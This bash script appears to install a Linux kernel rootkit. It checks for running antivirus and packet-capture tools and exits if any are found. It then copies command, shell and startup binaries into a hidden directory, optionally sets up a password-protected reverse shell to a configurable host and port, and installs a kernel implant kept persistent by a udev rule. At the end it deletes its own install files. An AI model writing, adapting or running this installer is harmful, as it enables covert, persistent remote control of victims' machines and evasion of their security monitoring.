#!/bin/bash

function random_gen_dec {
	RETVAL=$(shuf -i 50-99 -n 1)
}

res=`(ps -e || ps) | grep -iE 'wireshark|clamav|clamscan|Avast|Avria|McAfee|tcpdump|procmon' `
if [ $? -eq 0 ] 
  then
  echo 'shit, detected some antivirus so we exit: ' $res
  exit
fi

PWD="$(cd "$(dirname $0)" && pwd)"
source ".config" || \
{ echo "Error: no .config file found!"; exit; }

UDEV_DIR=/lib/udev
random_gen_dec && NAME=$RETVAL-$HIDE.rules
RULE=/lib/udev/rules.d/$NAME
[ ! -d /lib/udev/rules.d ] && RULE=/etc/udev/rules.d/$NAME

# first we need show file system
$HIDE/$HIDE_cmd show
rm -rf /$HIDE /lib/udev/rules.d/*$HIDE*.rule


# Copy "cmd" binary
cp $PWD/cmd /$HIDE/$HIDE"_cmd" && \

# Copy "shell" binary
cp $PWD/shell /$HIDE/$HIDE"_shell" && \

# Copy "bashrc"
cp $PWD/bashrc /$HIDE/$HIDE"_rc" && \

# Create start script
cp $PWD/start /$HIDE/$HIDE"_start" && \
sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
sed -i s!\#CMD!/$HIDE/$HIDE"_cmd"! /$HIDE/$HIDE"_start" && \
if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
	sed -i s!\#SHELL!/$HIDE/$HIDE"_shell"! /$HIDE/$HIDE"_start" && \
	sed -i s!LHOST!$LHOST! /$HIDE/$HIDE"_start" && \
	sed -i s!LPORT!$LPORT! /$HIDE/$HIDE"_start" && \
	sed -i s!PASS!$PASSWORD! /$HIDE/$HIDE"_start" && \
	sed -i s!INTERVAL!$INTERVAL! /$HIDE/$HIDE"_start" && \
	true || false;
fi

# Permissions
chmod 777 /$HIDE/* && \

# Copy kernel implant
cp $PWD/$HIDE /$HIDE/$HIDE && \

# Make persistent
cp $PWD/$HIDE $UDEV_DIR/$HIDE && \

#cp $PWD/rule $RULE && \
echo -n 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/lib/udev/'$HIDE'"' > $RULE \

# cleaning output dir ,
rm -rf $PWD  \
# rm -f $PWD/../upgrade.tar \

echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

# How to Uninstall
echo -e "UNINSTALL:\n"
echo -e "/$HIDE/$HIDE""_cmd show"
echo -e "rmmod $HIDE""_module"
echo -e "rm -rf /$HIDE $RULE $UDEV_DIR/$HIDE"
echo

